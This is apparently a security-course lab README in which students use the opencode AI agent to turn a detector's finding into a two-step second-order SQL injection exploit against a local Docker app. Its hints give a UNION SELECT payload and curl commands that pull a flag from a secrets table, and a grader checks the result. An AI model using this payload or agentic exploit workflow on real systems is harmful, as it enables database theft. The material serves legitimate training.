# Lab 7 — LLM Analysis → Exploit (agentic)

> **Mission**: this is the capstone. The detector already found a second-order
> chain (Labs 1–6). Now **drive opencode** to read that raw finding, reason out
> the attack, and produce a **working exploit** that pops a live target — then
> prove it by exfiltrating a flag.
>
> The LLM doesn't decide *whether* it's a bug (the taint engine did). It turns the
> machine's finding into a **weaponised exploit**.

```
trace.jsonl + source ──▶ opencode (you drive it) ──▶ exploit.sh ──▶ FLAG{...}
```

---

## The setup

- **Target** (`docker compose`): a small app with a real **second-order SQL
  injection**.
  - `POST /note` — stores your note **safely** (parameterised)  ← request #1
  - `GET /render?id=N` — pulls the stored note back and **concatenates it into a
    new SQL query** (`SELECT title FROM articles WHERE tag='<note>'`)  ← request #2
  - The flag lives only in a `secrets` table. The **only** way out is the SQLi.
  - A fresh random `FLAG{...}` is generated every run, so you can't fake it.
- **Raw detector output** you feed the AI: `trace.jsonl` (the taint chain) and the
  target source `target/app/router.php`.
- **Your answer**: `exploit.sh` — two curl steps (poison, then trigger).

---

## Your job

1. Start the target:
   ```bash
   cd lab07-llm-analysis
   docker compose up --build -d      # target on http://localhost:8090
   ```
2. **Open opencode and drive it** — feed it the finding + the source and have it
   reason out the exploit:
   ```bash
   opencode
   # then, in the session, something like:
   #   read trace.jsonl and target/app/router.php. This is a second-order SQL
   #   injection: a note stored via POST /note is later concatenated into
   #   SELECT title FROM articles WHERE tag='<note>' by GET /render?id=N.
   #   Write exploit.sh (two curl steps): store a UNION payload that leaks the
   #   flag from the secrets table, then trigger /render so it comes back.
   ```
3. Save what it produces into **`exploit.sh`** (fill the two TODOs). Keep the
   `TARGET="${TARGET:-http://localhost:8090}"` line and use **`$TARGET`** in every
   curl — don't hard-code the URL (the grader overrides `TARGET`).
4. Grade it:
   ```bash
   ./verify.sh
   ```

`verify.sh` runs your `exploit.sh` against the live target and **passes iff the
random flag comes back** — i.e. your exploit actually works.

> **Note:** the grader spins up its **own** isolated target on port **18090**
> (fresh random flag each run), so you can leave your manual `docker compose up`
> target on 8090 running for exploit dev — no clash. It also cleans up after
> itself and fails loudly if the target can't start. This is exactly why your
> exploit must use `$TARGET` and not a hard-coded `localhost:8090`.

---

## What "done" looks like

```
==> running exploit (.) ...
----- exploit output -----
FLAG{ab12...}
--------------------------
  ✓ exploit exfiltrated the flag via second-order SQLi
✓ PASS — Lab 7 owned.
```

---

## Hints

<details><summary>Hint: the injection shape</summary>

The stored note lands inside `... WHERE tag='<note>'`. Break out with a quote and
`UNION SELECT` the flag; comment out the trailing quote:

```
' UNION SELECT flag FROM secrets-- -
```
Store that as the note, then hit `/render?id=<returned id>`.
</details>

<details><summary>Hint: capturing the id from step 1</summary>

`POST /note` returns `{"id":N}`. Grab it:
```bash
id=$(curl -s "$TARGET/note" --data-urlencode "note=<payload>" \
     | sed -n 's/.*"id":\([0-9]*\).*/\1/p')
```
</details>

<details><summary>Why is this "second-order"?</summary>

The payload is stored **safely** in request #1 (parameterised insert). It only
becomes dangerous in request #2, when a *different* query pulls it out of the DB
and concatenates it. Single-request analysis of `/render` sees no user input —
the taint came from storage. That's exactly what Labs 1–6 were built to catch.
</details>

---

## Why grading is result-based

The LLM's wording is non-deterministic, so we don't grade its prose. We grade the
**artifact**: does the exploit it helped you write actually exfiltrate the flag?
The flag is random per run and reachable only through the SQLi, so a passing run
means a genuinely working second-order exploit — not a lucky string match.

## Security notes (discuss)

- The payload is attacker text flowing into your prompt → **prompt-injection**
  awareness when you feed untrusted data to an LLM.
- The exploit is generated code — **read it before running** it anywhere real.
- Using a **local** model (opencode + `ais3/gemma-4-26b`) keeps the finding and
  target details off third-party servers.

---

## Checklist

- [ ] `docker compose up` — target answers on `:8090`
- [ ] you drove opencode from `trace.jsonl` + source to an exploit
- [ ] `exploit.sh` poisons `/note` then triggers `/render`
- [ ] `./verify.sh` prints `✓ PASS` (flag exfiltrated)

🎉 Full pipeline: **Runtime (C) → Redis → Python correlation → AI-assisted
exploitation.** You went from an opcode hook to a working second-order exploit.
